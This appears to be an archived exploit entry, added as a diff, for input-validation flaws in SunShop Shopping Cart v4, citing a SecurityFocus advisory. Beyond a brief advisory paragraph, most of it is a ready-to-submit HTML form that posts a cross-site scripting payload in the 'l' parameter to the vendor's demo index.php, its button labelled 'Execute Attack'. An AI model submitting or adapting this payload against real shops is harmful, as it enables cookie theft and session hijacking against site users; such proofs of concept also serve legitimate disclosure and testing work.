@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/23856/info
+ 
+TurnkeyWebTools SunShop Shopping Cart is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+ 
+Exploiting these issues may allow an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, bypass the authentication mechanism, access or modify data, or exploit latent vulnerabilities in the underlying database implementation. Other attacks are also possible.
+ 
+SunShop Shopping Cart v4 is reported vulnerable; other versions may also be affected. 
+
+<form action="http://demos.turnkeywebtools.com/ss4/index.php" method="post">
+<input name="l" size=75 value="<script %0a%0d>alert(1);</script>">
+<input name="remove[0]" type="hidden" value="off">
+<input name="quantity[0:49]" type="hidden" value="1">
+<input name="remove[1]" type="hidden" value="off">
+<input name="quantity[1:50]" type="hidden" value="1">
+<input name="remove[2]" type="hidden" value="off">
+<input name="quantity[2:55]" type="hidden" value="1">
+<input name="remove[3]" type="hidden" value="off">
+<input name="quantity[3:42]" type="hidden" value="1">
+<input name="remove[4]" type="hidden" value="off">
+<input name="quantity[4:51]" type="hidden" value="1">
+<input name="coupon" type="hidden" value="email@address.com">
+<input type=submit value="Execute Attack on variable 'l' in index.php" class="button">
+</form>
